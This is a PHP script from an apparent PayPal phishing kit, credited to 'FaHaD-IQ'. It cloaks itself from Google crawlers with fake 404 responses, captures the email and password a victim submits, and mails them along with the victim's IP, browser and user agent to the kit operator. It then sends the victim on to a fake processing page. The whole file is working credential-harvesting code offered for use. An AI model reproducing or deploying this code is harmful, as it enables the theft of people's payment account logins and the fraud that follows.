<?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
error_reporting(0);
#################################################
#                FaHaD-IQ                       #
#              fb/mr.fahad6                     #
#################################################

session_start();
include("../../include/antibot.php");
include("../../include/__config__.php");
include("../../include/function.php");
include("lang/". $_SESSION['_lang_'].".php");
        $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
	$subject  = "PayPal Login N/n - [ " . $_SESSION['cntname'] . " / ".$_SESSION['_IP_']." ] ";
	$headers  = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= "From: Yeni Login/info <1login@loginfahad.com>";


if(strlen($_POST['pass']) < 8){
		header("Location: login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=true&confirmation_code=3b2hN76Aq6&act_num=confirm_account_3b2vhFa76bAq6&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");
		}
		else if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL) === true) {
		header("Location: login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=true&confirmation_code=3b2hN76Aq6&act_num=confirm_account_3b2vhFa76bAq6&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");
		}
		else {
			
		if ($_SESSION["_email_"] !=$_POST['email'] || $_SESSION["_password_"] !=$_POST['pass']){
		$_SESSION['_email_'] = $_POST['email'];
		$_SESSION['_password_'] = $_POST['pass'];
	$message = "

<div>

======================================</font><br />
	PayPal N/Login Yeni - FaHaD-HacK !</font><br />
======================================</font><br />
Client Email    : ".$_SESSION['_email_']."</font><br />
Client Password : <font color='#FF0000'>".$_SESSION['_password_']."</font><br />
======================================</font><br />
Client Browser  : ".$browser."</font><br />
Client Time     : ".$time."</font><br />
======================================</font><br />
Client Agent : ".$user_agent."</font><br />
Client IP : http://www.geoiptool.com/?IP=".$_SESSION['_IP_']."</font><br />
======================================</font><br />


</font></div>";

		@mail($to,$subject,$message,$headers);
        $logint="on";
						$_SESSION['logint'] = $logint;
        header("Location: websc-processing.php?country.x=".$_SESSION['cntname']."-".$_SESSION['cntcode']."&lang.x=".$_SESSION['_lang_']);
		}
		
		else {
	
		
		
		
		
						$_SESSION['logint'] = "on";

		
        header("Location: websc-processing.php?country.x=".$_SESSION['cntname']."-".$_SESSION['cntcode']."&lang.x=".$_SESSION['_lang_']);
        }
		}
		?>